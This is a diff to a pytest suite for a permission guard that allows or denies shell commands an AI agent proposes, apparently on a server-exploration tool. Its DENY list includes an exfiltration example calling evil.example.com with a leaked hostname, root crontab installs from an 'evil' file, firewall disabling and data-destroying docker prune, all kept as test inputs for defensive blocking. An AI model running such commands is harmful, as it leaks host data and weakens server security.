@@ -24,7 +24,7 @@ def run_guard(
     payload = json.dumps(
         {"tool_name": "Bash", "tool_input": {"command": command}, "session_id": "test"}
     )
-    env = {"SRV_EXPLORE_AUDIT": str(tmp_path / "audit.log"), "PYTHONUTF8": "1"}
+    env = {"PYTHONUTF8": "1"}
     if extra_env:
         env.update(extra_env)
     proc = subprocess.run(
@@ -64,7 +64,7 @@ ALLOW = [
     "cat /var/log/app.log",
     "tail -n 100 /var/log/app.log",
     "grep -i error app.log",
-    "curl -s https://api.example.com/health",
+    "curl -s http://localhost:8080/health",
     "ssh user@host docker ps",
     "systemctl status nginx",
     "journalctl -u nginx --since today",
@@ -75,8 +75,10 @@ ALLOW = [
     "yq '.services' docker-compose.yml",
     "docker images",
     "docker exec web cat /etc/hosts | grep db",
-    "curl -sSL https://api.example.com/health",
-    'curl -m 5 -H "Accept: application/json" https://api.example.com/v1/status',
+    "curl -sSL http://10.0.4.12/health",
+    'curl -m 5 -H "Accept: application/json" http://192.168.1.20:9000/v1/status',
+    "curl -s http://web:8080/metrics",
+    "curl -s http://[::1]:8500/v1/agent/checks",
     "ssh -p 2222 -i /home/app/key user@host cat /var/log/app.log",
     "cat /dev/null",
     "uniq -c app.log",
@@ -99,6 +101,32 @@ ALLOW = [
     "rabbitmqctl status",
     "rabbitmqctl -n rabbit@host cluster_status",
     "rabbitmqctl list_connections",
+    # docker noun-формы: read-глаголы
+    "docker system df",
+    "docker system info",
+    "docker image ls",
+    "docker volume ls",
+    "docker network ls",
+    "docker image inspect alpine",
+    "nproc",
+    "lscpu",
+    "lsblk -f",
+    "getconf PAGE_SIZE",
+    "docker --version",
+    "docker -v",
+    "dpkg-query -l bash",
+    # узкие read-guard'ы для серверных бинарей
+    "nginx -v",
+    "nginx -V",
+    "nginx -t",
+    "nginx -T",
+    "ufw status",
+    "ufw status verbose",
+    "ufw show raw",
+    "ufw version",
+    "crontab -l",
+    "crontab -u www-data -l",
+    "crontab -l -u www-data",
 ]
 
 DENY = [
@@ -220,6 +248,30 @@ DENY = [
     "rabbitmqctl stop_app",
     "rabbitmqctl delete_queue myqueue",
     "rabbitmqctl set_permissions -p / bob .* .* .*",
+    # docker noun-формы: write/stream остаются deny
+    "docker system prune -af",
+    "docker system events",
+    "docker volume create data",
+    "docker network create net",
+    # http: внешние хосты запрещены (внутренняя сеть свободно, внешнее по allowlist)
+    "curl -s https://api.example.com/health",
+    "curl https://evil.example.com/?leak=hostname",
+    "curl -s http://8.8.8.8/",
+    "curl -s",
+    # серверные бинари: write/сигнал/запуск/редактирование остаются deny
+    "nginx",
+    "nginx -s reload",
+    "nginx -s stop",
+    "nginx -g daemon off;",
+    "ufw enable",
+    "ufw disable",
+    "ufw allow 22",
+    "ufw delete allow 22",
+    "ufw reset",
+    "crontab -e",
+    "crontab -r",
+    "crontab /tmp/evil.cron",
+    "crontab -u root /tmp/evil.cron",
 ]
 
 
@@ -237,6 +289,38 @@ def test_deny(command: str, tmp_path: Path) -> None:
     if decision:
         out = decision.get("hookSpecificOutput", {})
         assert out.get("permissionDecision") == "deny"
+
+
+# --- плагины: выключен = запрещён ---------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "plugin, command",
+    [
+        ("docker", "docker ps"),
+        ("docker", "docker exec web cat /etc/hosts"),
+        ("postgres", 'psql -c "SELECT 1"'),
+        ("mongo", 'mongosh --eval "db.stats()"'),
+        ("redis", "redis-cli INFO"),
+        ("rabbitmq", "rabbitmqctl status"),
+        ("http", "curl -s http://localhost:8080/health"),
+        ("ssh", "ssh user@host uptime"),
+    ],
+)
+def test_plugin_disabled_denies(plugin: str, command: str, tmp_path: Path) -> None:
+    plugins = tmp_path / "plugins.json"
+    plugins.write_text(json.dumps({plugin: False}), encoding="utf-8")
+    env = {"SRV_EXPLORE_PLUGINS": str(plugins)}
+    code, _ = run_guard(command, tmp_path, extra_env=env)
+    assert code == 2, f"выключен плагин {plugin} — должно быть deny: {command}"
+    code, _ = run_guard("df -h", tmp_path, extra_env=env)
+    assert code == 0, "локальные read-команды не зависят от плагинов"
+
+
+def test_plugins_default_enabled(tmp_path: Path) -> None:
+    env = {"SRV_EXPLORE_PLUGINS": str(tmp_path / "нет_файла.json")}
+    code, _ = run_guard("docker ps", tmp_path, extra_env=env)
+    assert code == 0, "нет plugins.json — все известные плагины включены"
 
 
 # --- on-host сервис: egress закрыт (SRV_EXPLORE_NO_NETWORK) ---------------------
